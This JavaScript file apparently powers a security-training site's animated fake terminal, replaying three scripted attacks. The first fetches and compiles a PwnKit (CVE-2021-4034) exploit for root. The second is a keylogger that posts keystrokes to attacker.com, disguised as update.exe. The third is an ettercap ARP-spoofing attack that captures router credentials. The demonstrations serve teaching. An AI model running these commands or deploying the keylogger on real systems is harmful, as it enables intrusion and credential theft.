// Live Simulations Engine for Academy
const academySimulationScripts = {
  linux_privesc: [
    { text: "target@ubuntu:~$ uname -a", type: "cmd", delay: 500 },
    { text: "Linux ubuntu 5.4.0-91-generic #102-Ubuntu SMP Fri Nov 5 16:31:28 UTC 2021 x86_64 x86_64 x86_64 GNU/Linux", delay: 200 },
    { text: "target@ubuntu:~$ id", type: "cmd", delay: 400 },
    { text: "uid=1000(target) gid=1000(target) groups=1000(target)", delay: 200 },
    { text: "target@ubuntu:~$ find / -user root -perm -4000 -exec ls -ldb {} \\; 2>/dev/null", type: "cmd", delay: 1000 },
    { text: "-rwsr-xr-x 1 root root 64424 Dec  4  2020 /usr/bin/passwd", delay: 100 },
    { text: "-rwsr-xr-x 1 root root 84016 Dec  4  2020 /usr/bin/chfn", delay: 100 },
    { text: "-rwsr-xr-x 1 root root 31320 Feb 21  2021 /usr/bin/pkexec", type: "err", delay: 800 },
    { text: "[*] Found vulnerable SUID binary: /usr/bin/pkexec (CVE-2021-4034 PwnKit)", type: "warn", delay: 500 },
    { text: "target@ubuntu:~$ cd /tmp && curl -s https://raw.githubusercontent.com/arthepsy/CVE-2021-4034/main/cve-2021-4034-poc.c -o exploit.c", type: "cmd", delay: 1200 },
    { text: "target@ubuntu:/tmp$ gcc exploit.c -o exploit", type: "cmd", delay: 800 },
    { text: "target@ubuntu:/tmp$ ./exploit", type: "cmd", delay: 800 },
    { text: "[~] compile helper..", delay: 400 },
    { text: "[~] maybe get shell now?", delay: 300 },
    { text: "# id", type: "cmd", delay: 600 },
    { text: "uid=0(root) gid=0(root) groups=0(root),1000(target)", type: "err", delay: 400 },
    { text: "# whoami", type: "cmd", delay: 500 },
    { text: "root", type: "err", delay: 200 },
    { text: "[!!!] ROOT PRIVILEGE ESCALATION SUCCESSFUL [!!!]", type: "err", delay: 800 }
  ],
  python_keylogger: [
    { text: "root@kali:~# cat keylogger.py", type: "cmd", delay: 500 },
    { text: "import keyboard", type: "warn", delay: 100 },
    { text: "import requests", type: "warn", delay: 100 },
    { text: "def on_key(event):", type: "warn", delay: 100 },
    { text: "    requests.post('http://attacker.com/log', data={'key': event.name})", type: "warn", delay: 100 },
    { text: "keyboard.on_release(on_key)", type: "warn", delay: 100 },
    { text: "keyboard.wait()", type: "warn", delay: 400 },
    { text: "root@kali:~# pyinstaller --onefile --noconsole keylogger.py", type: "cmd", delay: 800 },
    { text: "79 INFO: PyInstaller: 5.6.2", delay: 200 },
    { text: "80 INFO: Python: 3.10.8", delay: 100 },
    { text: "154 INFO: Building EXE from EXE-00.toc completed successfully.", delay: 800 },
    { text: "[*] Sending update.exe to target...", delay: 600 },
    { text: "==================================================", delay: 100 },
    { text: "[WAITING] Listening for keystrokes on attacker.com...", type: "cmd", delay: 1500 },
    { text: "[+] Connection received from 192.168.1.55", type: "err", delay: 800 },
    { text: "[KEY] p", type: "err", delay: 200 },
    { text: "[KEY] a", type: "err", delay: 200 },
    { text: "[KEY] s", type: "err", delay: 200 },
    { text: "[KEY] s", type: "err", delay: 200 },
    { text: "[KEY] w", type: "err", delay: 200 },
    { text: "[KEY] o", type: "err", delay: 200 },
    { text: "[KEY] r", type: "err", delay: 200 },
    { text: "[KEY] d", type: "err", delay: 200 },
    { text: "[KEY] 1", type: "err", delay: 200 },
    { text: "[KEY] 2", type: "err", delay: 200 },
    { text: "[KEY] 3", type: "err", delay: 200 },
    { text: "[KEY] enter", type: "err", delay: 400 },
    { text: "[!!!] TARGET PASSWORD CAPTURED [!!!]", type: "err", delay: 500 }
  ],
  ccna_arp: [
    { text: "root@kali:~# ettercap -T -q -M arp:remote /192.168.1.100// /192.168.1.1//", type: "cmd", delay: 800 },
    { text: "ettercap 0.8.3.1 copyright 2001-2020 Ettercap Development Team", delay: 200 },
    { text: "Listening on: eth0 [192.168.1.50]", delay: 100 },
    { text: "MAC: 00:11:22:33:44:55", delay: 100 },
    { text: "Privileges dropped to EUID 65534 EGID 65534...", delay: 200 },
    { text: "Scanning for active hosts...", delay: 500 },
    { text: "2 hosts added to the hosts list...", delay: 200 },
    { text: "ARP poisoning victims:", type: "warn", delay: 300 },
    { text: " GROUP 1 : 192.168.1.100 ANY", type: "warn", delay: 100 },
    { text: " GROUP 2 : 192.168.1.1 ANY", type: "warn", delay: 100 },
    { text: "Starting sniffing...", delay: 400 },
    { text: "[*] Traffic is now routing through attacker machine (MITM).", type: "err", delay: 800 },
    { text: "root@kali:~# wireshark -k -i eth0 -f \"tcp port 80\"", type: "cmd", delay: 1000 },
    { text: "Capturing traffic from 192.168.1.100...", delay: 400 },
    { text: "POST /login HTTP/1.1", type: "err", delay: 500 },
    { text: "Host: internal-router.local", type: "err", delay: 100 },
    { text: "Authorization: Basic YWRtaW46Q2lzY28xMjMh", type: "err", delay: 200 },
    { text: "[!] Decoded Base64: admin:Cisco123!", type: "err", delay: 800 },
    { text: "[!!!] ROUTER ADMIN CREDENTIALS COMPROMISED VIA ARP SPOOFING [!!!]", type: "err", delay: 600 }
  ]
};

let academyTypingInterval = null;
let academyPrintLineTimeout = null;

function launchAcademySim(scriptId) {
  let overlay = document.getElementById('terminal-overlay');
  if(!overlay) {
    // Inject overlay if not present
    const overlayHtml = `
      <div class="terminal-overlay" id="terminal-overlay" onclick="if(event.target===this) closeAcademySim()">
        <div class="terminal-window" dir="ltr" style="text-align: left; direction: ltr;">
          <div class="terminal-header" style="display: flex; align-items: center; width: 100%;">
            <div class="terminal-dots">
              <span class="dot close" onclick="closeAcademySim()"></span>
              <span class="dot minimize"></span>
              <span class="dot maximize"></span>
            </div>
            <div class="terminal-title" style="flex-grow: 1; text-align: center;">root@kali:~</div>
            <div style="cursor:pointer; color:#ff4444; font-weight:bold; padding-right:10px; font-family: sans-serif;" onclick="closeAcademySim()">✖ Close</div>
          </div>
          <div class="terminal-body" id="terminal-output" dir="ltr" style="text-align: left; direction: ltr;"></div>
        </div>
      </div>
    `;
    document.body.insertAdjacentHTML('beforeend', overlayHtml);
    overlay = document.getElementById('terminal-overlay');
  }
  
  const output = document.getElementById('terminal-output');
  if(!output) return;
  
  const script = academySimulationScripts[scriptId];
  if(!script) return;

  overlay.classList.add('active');
  output.innerHTML = '';
  
  if (academyTypingInterval) clearInterval(academyTypingInterval);
  if (academyPrintLineTimeout) clearTimeout(academyPrintLineTimeout);
  
  let i = 0;
  function printLine() {
    if(i >= script.length) return;
    const line = script[i];
    const p = document.createElement('div');
    if(line.type === 'cmd') p.className = 'term-cmd';
    else if(line.type === 'err') p.className = 'term-err';
    else if(line.type === 'warn') p.className = 'term-warn';
    else p.style.color = '#0f0';
    
    p.style.whiteSpace = 'pre-wrap';
    output.appendChild(p);
    
    let charIdx = 0;
    academyTypingInterval = setInterval(() => {
      p.textContent += line.text.charAt(charIdx);
      charIdx++;
      output.scrollTop = output.scrollHeight;
      if(charIdx >= line.text.length) {
        clearInterval(academyTypingInterval);
        i++;
        academyPrintLineTimeout = setTimeout(printLine, line.delay);
      }
    }, 12);
  }
  printLine();
}

function closeAcademySim() {
  const overlay = document.getElementById('terminal-overlay');
  if (overlay) overlay.classList.remove('active');
  if (academyTypingInterval) clearInterval(academyTypingInterval);
  if (academyPrintLineTimeout) clearTimeout(academyPrintLineTimeout);
}
